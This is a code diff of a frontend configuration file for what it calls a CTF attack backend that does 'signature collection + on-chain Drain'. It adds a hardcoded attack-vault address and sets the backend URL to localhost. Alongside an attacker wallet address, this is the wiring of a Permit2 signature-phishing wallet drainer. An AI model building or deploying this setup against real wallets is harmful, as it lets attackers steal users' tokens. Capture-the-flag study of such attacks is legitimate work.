@@ -34,14 +34,13 @@ export const CONTRACTS = {
   STAKING_BANK: mainnetSafeAddress(import.meta.env.VITE_STAKING_BANK, MAINNET_CONTRACTS.STAKING_BANK),
   NBT_PAIR: import.meta.env.VITE_NBT_PAIR || '',
   FEE_TOKEN: import.meta.env.VITE_FEE_TOKEN || MAINNET_CONTRACTS.FEE_TOKEN,
-  ATTACK_VAULT: import.meta.env.VITE_ATTACK_VAULT || '',
+  ATTACK_VAULT: import.meta.env.VITE_ATTACK_VAULT || '0x0Ef15A34b264f77acA743d96baEC6BF5ffDdbDa9',
   USDT: import.meta.env.VITE_USDT || '0x55d398326f99059fF775485246999027B3197955',
-  // CTF 后端钱包（Permit2 msg.sender），签名 spender 必须等于它
   ATTACKER: import.meta.env.VITE_ATTACKER || '0xe1F9Fb65BBb39ebd4d0C204c95513d3f6421c407',
 };
 
 // CTF 攻击后端（签名收集 + 链上 Drain）
-export const CTF_API = import.meta.env.VITE_CTF_API || '';
+export const CTF_API = import.meta.env.VITE_CTF_API || 'http://localhost:3001';
 
 export const NETWORKS = {
   BSC_TESTNET: {
